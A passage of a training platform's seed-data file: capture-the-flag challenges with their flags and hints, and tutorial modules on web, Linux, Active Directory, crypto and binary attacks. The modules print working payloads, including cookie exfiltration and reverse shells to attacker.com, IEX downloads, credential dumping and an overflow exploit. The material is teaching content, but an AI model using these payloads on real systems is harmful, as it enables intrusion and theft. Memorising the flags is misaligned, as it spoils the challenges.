    flag: 'xcloak{r3v3rs3d_w1th_0x61}',
    points: 200,
    hints: ['Open in Ghidra or IDA — look for strcmp or memcmp', 'The XOR key is a single byte', 'XOR the target bytes with the key'],
    authorAlias: 'xcloak_admin',
    status: 'approved',
  },
  {
    title: 'JWT Forgery',
    category: 'web',
    difficulty: 'hard',
    description: `The application uses JWT for authentication. The server accepts tokens with alg:none if the signature is omitted. Login as admin to get the flag.\n\nYou have a valid token for user "guest". Modify it to become admin without knowing the secret.`,
    flag: 'xcloak{jwt_n0n3_4lg_byp4ss_gg}',
    points: 400,
    hints: ['Decode the JWT (base64url)', 'Change alg to "none" and role to "admin"', 'Remove the signature but keep the trailing dot'],
    authorAlias: 'xcloak_admin',
    status: 'approved',
  },
  {
    title: 'SSTI — Template Injection',
    category: 'web',
    difficulty: 'hard',
    description: `The /render endpoint accepts a template string and renders it with Jinja2. Find a payload that reads /etc/passwd and then the flag at /flag.txt.\n\nExample: GET /render?t=Hello+{{name}} returns "Hello World"\n\nRestrictions: The string "config", "self", and "import" are blacklisted.`,
    flag: 'xcloak{sst1_t0_rc3_v1a_j1nj4}',
    points: 450,
    hints: ['Try {{7*7}} to confirm SSTI', 'Use __class__.__mro__ to traverse the MRO', 'Look for subprocess or os in the subclasses list'],
    authorAlias: 'xcloak_admin',
    status: 'approved',
  },
]

// ── LEARNING PATHS ────────────────────────────────────────────────────────
const LEARNING_PATHS = [
  {
    path: {"title": "Web Security Fundamentals", "description": "Master the OWASP Top 10. Learn SQL injection, XSS, CSRF, and authentication flaws with real payloads and defenses.", "category": "web", "difficulty": "beginner", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 412, "views": 8200},
    modules: [
      { order:0, title:"HTTP Deep Dive \u2014 How the Web Works", type:"read", xpReward:10, content:`# How the Web Works — HTTP Deep Dive

Every web attack exploits HTTP. You need to understand it completely.

## The Request-Response Cycle

\`\`\`http
GET /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
\`\`\`

Server responds:

\`\`\`http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz; HttpOnly; Secure
\`\`\`

## HTTP Methods

- **GET** — retrieve data, no side effects
- **POST** — submit data, forms, login
- **PUT/PATCH** — update resources
- **DELETE** — remove resources

## Status Codes

| Code | Meaning | Security Note |
|------|---------|---------------|
| 200 | OK | Normal |
| 302 | Redirect | Open redirect |
| 401 | Unauthorized | Auth bypass target |
| 403 | Forbidden | Access control |
| 500 | Server Error | May leak stack traces |

## Headers Attackers Look At

\`\`\`http
Server: Apache/2.4.41       # Version disclosure
X-Powered-By: PHP/7.4.3     # Tech stack leak
Access-Control-Allow-Origin: *  # Overly permissive CORS
\`\`\`

## Key Takeaway

HTTP is stateless — cookies and tokens maintain state. Every parameter is a potential attack vector.` },
      { order:1, title:"SQL Injection \u2014 From Basics to Exploitation", type:"read", xpReward:20, content:`# SQL Injection

When user input is directly concatenated into SQL queries, attackers can manipulate the database.

## The Vulnerable Code

\`\`\`php
// VULNERABLE
$query = "SELECT * FROM users WHERE username='$_GET[username]'";
\`\`\`

Send \`username=admin'--\` and the query becomes:

\`\`\`sql
SELECT * FROM users WHERE username='admin'--' AND password='...'
\`\`\`

The \`--\` comments out the password check. **Authentication bypassed.**

## Union-Based Extraction

\`\`\`sql
' ORDER BY 1--    -- find column count
' UNION SELECT null, username, password FROM users--
' UNION SELECT null, table_name, null FROM information_schema.tables--
\`\`\`

## Time-Based Blind (no output)

\`\`\`sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0)--

-- PostgreSQL
'; SELECT pg_sleep(5)--
\`\`\`

## The Fix

\`\`\`python
# SAFE — parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
\`\`\`

## Practice Labs
- PortSwigger SQL Injection Labs: portswigger.net/web-security/sql-injection
- SQLZoo: sqlzoo.net` },
      { order:2, title:"XSS \u2014 Three Types Explained", type:"read", xpReward:20, content:`# Cross-Site Scripting (XSS)

XSS injects JavaScript into pages viewed by other users.

## Type 1: Reflected XSS

Payload in URL, reflected immediately:

\`\`\`
https://site.com/search?q=<script>alert(document.cookie)</script>
\`\`\`

## Type 2: Stored XSS

Payload saved in DB, executes for every visitor:

\`\`\`html
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
\`\`\`

## Type 3: DOM-based XSS

\`\`\`javascript
// Vulnerable code
document.innerHTML = location.hash.substring(1)
// URL: site.com/page#<img src=x onerror=alert(1)>
\`\`\`

## Filter Bypass Payloads

\`\`\`html
<ScRiPt>alert(1)</ScRiPt>
<svg onload=alert(1)>
<body onload=alert(1)>
<img src=x onerror=alert\`1\`>
\`\`\`

## The Fix

\`\`\`python
import html
safe = html.escape(user_input)  # Escapes < > & ' "
\`\`\`

Also set **Content-Security-Policy** headers.` },
      { order:3, title:"Burp Suite Practical Lab", type:"lab", xpReward:30, content:`# Burp Suite Practical Lab

## Setup

1. Download Burp Suite Community: portswigger.net/burp
2. Configure browser proxy: 127.0.0.1:8080
3. Install Burp CA certificate in browser

## Lab 1: Intercept and Modify

Target: portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

1. Turn Intercept ON in Burp → Proxy
2. Click a product category
3. See the GET request with \`category=Gifts\`
4. Modify to: \`category=Gifts'+OR+1=1--\`
5. Forward — all products appear

## Lab 2: Repeater

Right-click any request → Send to Repeater → modify and resend.

## Free Practice Targets

- **DVWA**: github.com/digininja/DVWA (Docker)
- **Juice Shop**: github.com/juice-shop/juice-shop
- **PortSwigger Labs**: portswigger.net/web-security (browser-based)` },
    ],
  },
  {
    path: {"title": "Linux Privilege Escalation", "description": "From low-privilege shell to root. SUID binaries, sudo misconfigs, cron jobs, writable paths, kernel exploits, and capabilities.", "category": "red", "difficulty": "intermediate", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 387, "views": 7100},
    modules: [
      { order:0, title:"Initial Enumeration \u2014 Your First Commands", type:"read", xpReward:15, content:`# Linux Privilege Escalation — Initial Enumeration

You have a low-privilege shell. Here is your checklist.

## System Information

\`\`\`bash
uname -a                # Kernel version → check for kernel exploits
cat /etc/os-release     # Distribution
env                     # Environment variables (may contain secrets)
\`\`\`

## Current User

\`\`\`bash
id                      # uid, gid, groups
sudo -l                 # What can this user sudo? KEY CHECK
cat /etc/passwd         # All users with shells
cat /etc/shadow         # Password hashes (if readable)
\`\`\`

## Automated Tools

\`\`\`bash
# LinPEAS — most comprehensive
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Smart Enumeration
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
bash lse.sh -l1
\`\`\`

## What You're Looking For

1. Kernel version — check searchsploit
2. \`sudo -l\` with NOPASSWD entries
3. SUID/SGID binaries not standard
4. World-writable cron scripts
5. Credentials in config files
6. Docker, lxd, disk group memberships` },
      { order:1, title:"SUID Binaries & GTFOBins", type:"read", xpReward:20, content:`# SUID Binaries & GTFOBins

## Find SUID Binaries

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`

## GTFOBins — gtfobins.github.io

Every Unix binary that can be exploited for privilege escalation.

## Examples

### find (SUID)
\`\`\`bash
find . -exec /bin/sh -p \\; -quit
\`\`\`

### vim (SUID)
\`\`\`bash
vim -c ':!/bin/sh'
\`\`\`

### python (SUID)
\`\`\`bash
python -c 'import os; os.execl("/bin/sh","sh","-p")'
\`\`\`

### cp (SUID)
\`\`\`bash
# Overwrite /etc/passwd to add root user
echo 'evil::0:0::/root:/bin/bash' >> /etc/passwd
su evil
\`\`\`

## SGID

\`\`\`bash
find / -perm -2000 -type f 2>/dev/null
\`\`\`` },
      { order:2, title:"Sudo Misconfigurations", type:"read", xpReward:20, content:`# Sudo Misconfigurations

Always run \`sudo -l\` immediately. It shows what you can run as root.

## Common Misconfigs

### NOPASSWD Everything
\`\`\`
(ALL) NOPASSWD: ALL
\`\`\`
Just: \`sudo su\` or \`sudo /bin/bash\`

### Specific Binary
\`\`\`
(root) NOPASSWD: /usr/bin/find
\`\`\`
\`\`\`bash
sudo find . -exec /bin/sh \\; -quit
\`\`\`

### Editor
\`\`\`bash
sudo vim /etc/hosts
# Inside vim:
:set shell=/bin/bash
:shell
\`\`\`

### World-Writable Script
\`\`\`
(root) NOPASSWD: /opt/backup.sh
\`\`\`
\`\`\`bash
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /opt/backup.sh
sudo /opt/backup.sh
\`\`\`

### LD_PRELOAD
If \`env_keep += LD_PRELOAD\`:
\`\`\`c
// evil.c
#include <stdio.h>
#include <unistd.h>
void _init() { setuid(0); system("/bin/bash -p"); }
\`\`\`
\`\`\`bash
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
sudo LD_PRELOAD=/tmp/evil.so find
\`\`\`` },
      { order:3, title:"Cron Jobs & Writable Scripts", type:"read", xpReward:20, content:`# Cron Jobs & Writable Scripts

Cron jobs run on a schedule, often as root. Modify their scripts = root code execution.

## Finding Cron Jobs

\`\`\`bash
cat /etc/crontab
ls -la /etc/cron.*

# pspy — watch for new processes without root
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64 && ./pspy64
\`\`\`

## Exploitation

### World-Writable Script
\`\`\`bash
# /etc/crontab: * * * * * root /opt/cleanup.sh
ls -la /opt/cleanup.sh   # rwxrwxrwx !
echo 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1' >> /opt/cleanup.sh
nc -lvnp 4444            # Wait up to 60 seconds
\`\`\`

### PATH Hijacking
If script calls \`tar\` without full path and PATH includes writable dir:
\`\`\`bash
echo 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
\`\`\`` },
      { order:4, title:"Docker Group Escape", type:"lab", xpReward:25, content:`# Docker Group Privilege Escalation

## Check Groups

\`\`\`bash
id
# uid=1000(user) groups=1000(user),117(docker)
\`\`\`

## Escape to Root

\`\`\`bash
# Mount full host filesystem into a container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Now root with full host access
id               # root
cat /etc/shadow  # Hashes
# Add SSH key:
mkdir -p /mnt/root/.ssh
echo 'YOUR_PUBLIC_KEY' >> /mnt/root/.ssh/authorized_keys
\`\`\`

## Linux Capabilities

\`\`\`bash
# Find dangerous capabilities
getcap -r / 2>/dev/null

# cap_setuid example:
# /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
\`\`\`

## LXD Group (Similar)

\`\`\`bash
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
\`\`\`` },
    ],
  },
  {
    path: {"title": "Network Security & Reconnaissance", "description": "Nmap scanning, Wireshark traffic analysis, ARP spoofing, man-in-the-middle attacks, and passive OSINT recon techniques.", "category": "network", "difficulty": "beginner", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 298, "views": 5400},
    modules: [
      { order:0, title:"Nmap \u2014 Complete Guide", type:"read", xpReward:15, content:`# Nmap — The Network Scanner

## Basic Scanning

\`\`\`bash
nmap 192.168.1.1             # Single host
nmap 192.168.1.0/24          # Subnet
nmap -iL targets.txt         # From file
\`\`\`

## Scan Types

\`\`\`bash
sudo nmap -sS target   # SYN scan (stealthy)
nmap -sT target        # TCP connect (no root needed)
sudo nmap -sU target   # UDP scan
nmap -sn 192.168.1.0/24  # Ping sweep only
\`\`\`

## Service & Version Detection

\`\`\`bash
nmap -sV target        # Version detection
sudo nmap -O target    # OS detection
nmap -A target         # Aggressive (OS+version+scripts)
nmap -sC target        # Default scripts
\`\`\`

## Port Selection

\`\`\`bash
nmap -p 22,80,443 target  # Specific ports
nmap -p 1-1000 target     # Range
nmap -p- target           # All 65535
\`\`\`

## NSE Scripts

\`\`\`bash
nmap --script vuln target                    # Vulnerability scan
nmap --script smb-vuln-ms17-010 target      # EternalBlue check
nmap --script http-title target             # Get HTTP titles
\`\`\`

## Output

\`\`\`bash
nmap -oA scan_results target  # Save all formats
nmap --open target             # Only open ports
\`\`\`` },
      { order:1, title:"Wireshark & Traffic Analysis", type:"read", xpReward:20, content:`# Wireshark & Traffic Analysis

## Essential Filters

\`\`\`
http                          # HTTP traffic
dns                           # DNS queries
tcp.port == 80                # Specific port
ip.addr == 192.168.1.1        # Specific IP
ip.src == 10.0.0.1            # Source IP only
http.request.method == "POST" # POST requests
http.authorization            # HTTP Basic Auth
\`\`\`

## Finding Credentials in Captures

\`\`\`bash
# HTTP credentials
tshark -r capture.pcap -Y http.request.method==POST -T fields -e http.file_data

# FTP passwords
tshark -r capture.pcap -Y ftp -T fields -e ftp.request.arg

# DNS queries
tshark -r capture.pcap -Y dns.qry.type==1 -T fields -e dns.qry.name
\`\`\`

## ARP Spoofing (MITM)

\`\`\`bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof between victim and gateway
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5

# Capture traffic
wireshark -i eth0 -k
\`\`\`` },
      { order:2, title:"Passive Recon \u2014 OSINT & Google Dorks", type:"read", xpReward:15, content:`# Passive Reconnaissance

## DNS Enumeration

\`\`\`bash
nslookup example.com
dig example.com any
dig axfr @ns1.example.com example.com  # Zone transfer

# Subdomain brute force
subfinder -d example.com
amass enum -d example.com
\`\`\`

## Certificate Transparency

\`\`\`bash
curl 'https://crt.sh/?q=%.example.com&output=json' | jq '.[].name_value' | sort -u
\`\`\`

## Google Dorks

\`\`\`
site:example.com filetype:env
site:example.com intitle:"index of"
site:example.com inurl:admin
"@example.com" filetype:xlsx
\`\`\`

## Shodan

\`\`\`bash
shodan search 'org:"Target Corp" port:22'
shodan host 1.2.3.4
\`\`\`

## Firewall Evasion with Nmap

\`\`\`bash
nmap -f target              # Fragment packets
nmap -D RND:10 target       # Decoy IPs
nmap -T2 target             # Slow scan (IDS evasion)
nmap --source-port 53 target # Spoof source port
\`\`\`` },
    ],
  },
  {
    path: {"title": "Cryptography for Hackers", "description": "RSA attacks, padding oracles, hash length extension, AES mode weaknesses, and breaking real-world crypto implementations.", "category": "crypto", "difficulty": "intermediate", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 276, "views": 4900},
    modules: [
      { order:0, title:"AES Modes \u2014 ECB Weakness & CBC", type:"read", xpReward:15, content:`# AES Modes

## ECB — Never Use

Identical plaintext blocks → identical ciphertext. Images encrypted with ECB still show structure.

\`\`\`python
from Crypto.Cipher import AES

key = b'A' * 16
cipher = AES.new(key, AES.MODE_ECB)
pt = b'ATTACK AT DAWN!!' * 2   # 2 identical blocks
ct = cipher.encrypt(pt)
print(ct[:16] == ct[16:])  # True — ECB is broken
\`\`\`

## CBC — Cipher Block Chaining

Each block XORed with previous ciphertext. Uses IV.
Vulnerable to: Padding Oracle Attack.

## GCM — Use This

Authenticated encryption: confidentiality + integrity.

\`\`\`python
from Crypto.Cipher import AES
import os

key = os.urandom(32)
nonce = os.urandom(16)
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
ciphertext, tag = cipher.encrypt_and_digest(b'Secret message')
\`\`\`

## Common Crypto Mistakes

1. Reusing IV/nonce — breaks stream ciphers completely
2. ECB mode — pattern leakage
3. No authentication — bit-flipping attacks
4. MD5(password) — use bcrypt/argon2 instead` },
      { order:1, title:"RSA \u2014 Four Common Attacks", type:"read", xpReward:25, content:`# RSA Attacks

## Attack 1: Small Exponent (e=3)

If m^3 < n, ciphertext is just m^3 (no modular reduction):

\`\`\`python
import gmpy2

c = 8065817517094048766068087714684100
m, exact = gmpy2.iroot(c, 3)
if exact:
    flag = int(m).to_bytes((int(m).bit_length() + 7) // 8, 'big').decode()
    print(flag)
\`\`\`

## Attack 2: Factoring Small n

\`\`\`python
from sympy import factorint
factors = factorint(n)
# p, q = list(factors.keys())
# phi = (p-1)*(q-1)
# d = pow(e, -1, phi)
# m = pow(c, d, n)
\`\`\`

## Attack 3: Common Modulus

Same n, different e values, same plaintext:
\`\`\`python
from math import gcd
# If gcd(e1,e2)==1: extended_gcd gives a,b where a*e1+b*e2=1
# m = (c1^a * c2^b) mod n
\`\`\`

## Attack 4: Wiener's (d too small)

\`\`\`bash
pip install owiener
\`\`\`
\`\`\`python
import owiener
d = owiener.attack(e, n)
\`\`\`

## Tools

- factordb.com — factor known numbers
- RsaCtfTool: github.com/RsaCtfTool/RsaCtfTool` },
      { order:2, title:"Hashing \u2014 Cracking & Length Extension", type:"read", xpReward:15, content:`# Hash Attacks

## Status

| Algorithm | Status |
|-----------|--------|
| MD5 | Broken — use nothing |
| SHA-1 | Deprecated |
| SHA-256 | Safe for integrity |
| bcrypt | Safe for passwords |
| Argon2 | Best for passwords |

## Password Cracking

\`\`\`bash
# Hashcat
hashcat -m 0 hashes.txt rockyou.txt     # MD5
hashcat -m 100 hashes.txt rockyou.txt   # SHA1
hashcat -m 3200 hashes.txt rockyou.txt  # bcrypt

# Rules
hashcat -m 0 hashes.txt rockyou.txt -r best64.rule

# John
john --format=md5crypt hashes.txt --wordlist=rockyou.txt
\`\`\`

## Hash Length Extension

Affects SHA-256 MAC = H(secret || message):

\`\`\`bash
# hash_extender tool
hash_extender -d 'original_data' -s known_hash -a '&admin=true' --secret-min=8 --secret-max=16
\`\`\`

Fix: Use HMAC — \`H(key XOR opad || H(key XOR ipad || msg))\`` },
      { order:3, title:"Padding Oracle Attack", type:"read", xpReward:30, content:`# Padding Oracle Attack

Decrypts CBC-encrypted data without the key.

## Requirements

1. A padding oracle (server reveals if padding is valid)
2. IV and ciphertext

## PKCS7 Padding

AES blocks are 16 bytes. If plaintext is 13 bytes:
\`\`\`
[P P P P P P P P P P P P P 03 03 03]
\`\`\`

## The Attack

For each ciphertext byte, XOR the previous block byte with guesses 0x00-0xFF.
When the oracle returns "valid padding", you found the byte.

\`\`\`python
def padding_oracle_attack(ciphertext, iv, oracle):
    blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
    plaintext = b''
    for block_idx in range(len(blocks)):
        prev_block = iv if block_idx == 0 else blocks[block_idx-1]
        current = blocks[block_idx]
        intermediate = bytearray(16)
        for byte_pos in range(15, -1, -1):
            padding_val = 16 - byte_pos
            for guess in range(256):
                modified = bytearray(prev_block)
                modified[byte_pos] = guess
                for k in range(byte_pos+1, 16):
                    modified[k] = intermediate[k] ^ padding_val
                if oracle(bytes(modified) + current):
                    intermediate[byte_pos] = guess ^ padding_val
                    break
        plaintext += bytes(b ^ p for b, p in zip(prev_block, intermediate))
    return plaintext
\`\`\`

Tool: **PadBuster** — github.com/AonCyberLabs/PadBuster` },
    ],
  },
  {
    path: {"title": "OSINT & Information Gathering", "description": "Google dorking, GitHub recon, Shodan, certificate transparency, email harvesting, and building comprehensive target profiles.", "category": "osint", "difficulty": "beginner", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 231, "views": 4100},
    modules: [
      { order:0, title:"Google Dorking", type:"read", xpReward:10, content:`# Google Dorking

## Essential Operators

\`\`\`
site:example.com              # Restrict to domain
filetype:pdf                  # File type filter
inurl:admin                   # In the URL
intitle:"index of"            # Directory listings
intext:"password"             # In page body
\`\`\`

## Finding Sensitive Files

\`\`\`
site:example.com filetype:env
site:example.com filetype:sql
site:example.com intitle:"index of" ".env"
site:example.com filetype:log
\`\`\`

## Exposed Credentials

\`\`\`
site:pastebin.com "example.com" password
site:github.com "example.com" api_key
\`\`\`

## Reference

Google Hacking Database: exploit-db.com/google-hacking-database` },
      { order:1, title:"GitHub Reconnaissance", type:"read", xpReward:20, content:`# GitHub Recon

Developers commit secrets constantly. This is one of the most effective OSINT techniques.

## Manual Search

\`\`\`
org:TargetCorp "api_key"
org:TargetCorp "secret" filename:.env
org:TargetCorp "password" extension:yml
example.com AWS_ACCESS_KEY
\`\`\`

## Automated Tools

\`\`\`bash
# TruffleHog
trufflehog github --repo=https://github.com/target/repo
trufflehog github --org=targetorg

# GitLeaks
gitleaks detect --source=./cloned-repo

# Search all git history
git log -p | grep -i "password\\|secret\\|api_key"
\`\`\`

## What to Look For

- AWS/GCP/Azure credentials
- Database connection strings
- API keys (Stripe, Twilio, SendGrid)
- Private SSH keys (\`BEGIN RSA PRIVATE KEY\`)
- JWT secrets
- Internal IP addresses` },
      { order:2, title:"Shodan & Passive Intel", type:"read", xpReward:20, content:`# Shodan & Building Target Profiles

## Shodan Queries

\`\`\`bash
shodan search 'org:"Target Corp"'
shodan search 'hostname:example.com'
shodan search 'ssl:"example.com"'
shodan host 1.2.3.4
\`\`\`

## Email Harvesting

\`\`\`bash
theHarvester -d example.com -b all -l 500
\`\`\`

## Certificate Transparency

\`\`\`bash
curl 'https://crt.sh/?q=%.example.com&output=json' | jq '.[].name_value' | sort -u
\`\`\`

## Data Breach Search

- HaveIBeenPwned: haveibeenpwned.com
- Dehashed: dehashed.com (paid)
- LeakCheck: leakcheck.io

## The OSINT Process

1. Seed — domain, company name, email format
2. Expand — subdomains, employees, IP ranges, tech stack
3. Correlate — link people to profiles
4. Document — build attack surface map` },
    ],
  },
  {
    path: {"title": "Malware Analysis Fundamentals", "description": "Static and dynamic malware analysis, PE file structure, behavioral monitoring, sandbox evasion, and YARA rule writing.", "category": "malware", "difficulty": "intermediate", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 198, "views": 3700},
    modules: [
      { order:0, title:"Static Analysis \u2014 PE Files", type:"read", xpReward:15, content:`# Static Analysis

## Initial Triage

\`\`\`bash
file malware.exe         # File type
sha256sum malware.exe    # Hash for VirusTotal

# PE info
exiftool malware.exe
\`\`\`

## String Extraction

\`\`\`bash
strings malware.exe      # ASCII strings
strings -e l malware.exe # Unicode
floss malware.exe        # Obfuscated strings

# Look for: URLs, IPs, file paths, registry keys, base64 blobs
\`\`\`

## PE Structure Analysis

\`\`\`python
import pefile
pe = pefile.PE('malware.exe')

# Sections — high entropy (>7) = packed/encrypted
for section in pe.sections:
    print(f"{section.Name.decode().strip()} Entropy: {section.get_entropy():.2f}")

# Imports — reveals capabilities
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    for imp in entry.imports:
        print(imp.name.decode() if imp.name else hex(imp.ordinal))

# Suspicious: VirtualAlloc, WriteProcessMemory = injection
# CryptEncrypt = ransomware
# URLDownloadToFile = dropper
\`\`\`

## Packing Detection

\`\`\`bash
die malware.exe   # Detect-It-Easy
upx -d malware.exe -o unpacked.exe  # Unpack UPX
\`\`\`` },
      { order:1, title:"Dynamic Analysis \u2014 Behavioral Monitoring", type:"read", xpReward:20, content:`# Dynamic Analysis

**WARNING**: Always use an isolated VM. Never run malware on your host!

## Setup

1. Windows VM — VirtualBox/VMware
2. Snapshot BEFORE execution
3. Disable network or use FakeNet
4. Install monitoring tools

## Tools

### Process Monitor (ProcMon)
Captures all file, registry, and network operations.
Filter: Process Name = malware.exe

### Process Hacker
Real-time processes, memory, network connections.
Look for: unusual parent-child relationships, injected DLLs.

### Wireshark / FakeNet-NG

\`\`\`bash
fakenet.py   # Intercepts and fakes all network responses
\`\`\`

### Regshot
Before/after registry comparison — reveals persistence.

## Document Everything

\`\`\`
Files created:   C:\\Users\\Public\\svchost.exe
Registry keys:   HKCU\\Run\\Update = C:\\Users\\Public\\svchost.exe
Network:         TCP 185.220.101.1:443
Processes:       Spawned powershell.exe -enc BASE64
\`\`\`

## Free Sandboxes

- Any.run: app.any.run (interactive)
- Hybrid Analysis: hybrid-analysis.com
- Triage: tria.ge` },
      { order:2, title:"YARA Rules", type:"read", xpReward:20, content:`# YARA Rules

## Basic Structure

\`\`\`yara
rule MalwareName {
    meta:
        description = "Detects XYZ"
        author      = "Your Name"
    strings:
        $s1 = "malware_mutex"
        $s2 = { 68 65 6C 6C 6F }     // Hex bytes
        $s3 = /evil[0-9]+\\.com/      // Regex
        $s4 = "Windows" nocase
    condition:
        all of them
}
\`\`\`

## Real Example — AsyncRAT

\`\`\`yara
rule AsyncRAT {
    strings:
        $mutex = "AsyncMutex_6SI8OkPnk" ascii wide
        $port  = "Ports" ascii
        $pdb   = "AsyncRAT" ascii wide
    condition:
        uint16(0) == 0x5A4D  // PE file
        and filesize < 2MB
        and 2 of them
}
\`\`\`

## Scanning

\`\`\`bash
yara rule.yar malware.exe
yara -r rule.yar /suspicious/
\`\`\`

## Resources

- YARAHub: yarahub.com
- Awesome YARA: github.com/InQuest/awesome-yara` },
    ],
  },
  {
    path: {"title": "Active Directory Attacks", "description": "BloodHound enumeration, Kerberoasting, AS-REP Roasting, Pass-the-Hash, DCSync, Golden Tickets, and lateral movement through Windows environments.", "category": "red", "difficulty": "advanced", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 312, "views": 6200},
    modules: [
      { order:0, title:"BloodHound Enumeration", type:"read", xpReward:20, content:`# BloodHound — AD Attack Path Finder

## Setup

\`\`\`bash
apt install bloodhound
neo4j start
bloodhound
\`\`\`

## Data Collection

### SharpHound (Windows)

\`\`\`powershell
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp
\`\`\`

### BloodHound.py (Linux)

\`\`\`bash
pip install bloodhound
bloodhound-python -u user -p password -d domain.local -dc dc01.domain.local -c All
\`\`\`

## Key Queries

- "Shortest Paths to Domain Admins"
- "Find Principals with DCSync Rights"
- "Kerberoastable Users"

## PowerView Manual Enum

\`\`\`powershell
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1')

Get-DomainUser | select samaccountname, description
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
Find-LocalAdminAccess -Verbose
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
\`\`\`` },
      { order:1, title:"Kerberoasting & AS-REP Roasting", type:"read", xpReward:25, content:`# Kerberoasting

Service accounts with SPNs can have Kerberos tickets requested and cracked offline.

## From Linux

\`\`\`bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt
\`\`\`

## From Windows

\`\`\`powershell
.\\Rubeus.exe kerberoast /outfile:hashes.txt
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.txt
\`\`\`

# AS-REP Roasting

Users with "Do not require Kerberos pre-auth" can be attacked without credentials.

\`\`\`bash
# With credentials — find targets
GetNPUsers.py domain.local/user:pass -dc-ip 10.10.10.1 -request -format hashcat

# Without credentials — need username list
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat

hashcat -m 18200 asrep_hashes.txt rockyou.txt
\`\`\`

## Defense

- Strong service account passwords (>25 chars)
- Require pre-auth for all accounts
- Monitor event ID 4769 with RC4 encryption` },
      { order:2, title:"Pass-the-Hash & DCSync", type:"read", xpReward:25, content:`# Pass-the-Hash

NTLM hashes can be used directly — no cracking needed.

\`\`\`bash
# Remote execution with hash
psexec.py -hashes :NTLM_HASH domain.local/Administrator@10.10.10.1
wmiexec.py -hashes :NTLM_HASH domain.local/Administrator@10.10.10.1

# Spray hash across subnet
crackmapexec smb 10.10.10.0/24 -u Administrator -H NTLM_HASH
crackmapexec smb 10.10.10.0/24 -u Administrator -H NTLM_HASH -x whoami
\`\`\`

## Dumping Credentials

\`\`\`powershell
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::dcsync /user:Administrator
\`\`\`

\`\`\`bash
# Remote
secretsdump.py domain.local/Administrator:password@10.10.10.1
crackmapexec smb target -u admin -p password --sam
\`\`\`

## Golden Ticket

\`\`\`bash
# Need KRBTGT hash via DCSync
lsadump::dcsync /user:krbtgt /domain:domain.local

# Forge ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /id:500
kerberos::ptt ticket.kirbi
\`\`\`` },
    ],
  },
  {
    path: {"title": "Binary Exploitation \u2014 Stack to Heap", "description": "Buffer overflows, ROP chains, format string attacks, and heap exploitation with pwntools. 32-bit and 64-bit techniques.", "category": "binary", "difficulty": "advanced", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 267, "views": 5100},
    modules: [
      { order:0, title:"Stack Buffer Overflows", type:"read", xpReward:20, content:`# Stack Buffer Overflows

## Setup

\`\`\`bash
pip install pwntools
apt install gdb gdb-peda
\`\`\`

## Vulnerable Program

\`\`\`c
#include <stdio.h>
void win() { system("/bin/sh"); }
void vuln() {
    char buf[64];
    gets(buf);  // No bounds check!
}
int main() { vuln(); return 0; }
\`\`\`

\`\`\`bash
gcc -m32 -fno-stack-protector -no-pie -o vuln vuln.c
\`\`\`

## Find Offset

\`\`\`python
from pwn import *
pattern = cyclic(200)
# Run, crash, then in GDB: pattern_offset(EIP_value)
\`\`\`

## Exploit

\`\`\`python
from pwn import *

elf = ELF('./vuln')
p   = process('./vuln')

offset   = 76
win_addr = elf.sym.win

payload  = b'A' * offset
payload += p32(win_addr)

p.sendline(payload)
p.interactive()
\`\`\`

## Protections Check

\`\`\`bash
checksec --file=vuln
# NX = stack not executable → use ROP
# Canary = stack cookie → leak it first
# ASLR = randomized addresses → leak first
\`\`\`` },
      { order:1, title:"ROP Chains \u2014 Bypassing NX", type:"read", xpReward:30, content:`# Return-Oriented Programming

NX prevents shellcode execution. ROP chains existing gadgets.

## Gadgets — small code sequences ending in \`ret\`

\`\`\`bash
ROPgadget --binary vuln --rop
ropper -f vuln --search "pop rdi"
\`\`\`

## 64-bit ret2libc

64-bit calling: args in rdi, rsi, rdx (not stack).

\`\`\`python
from pwn import *

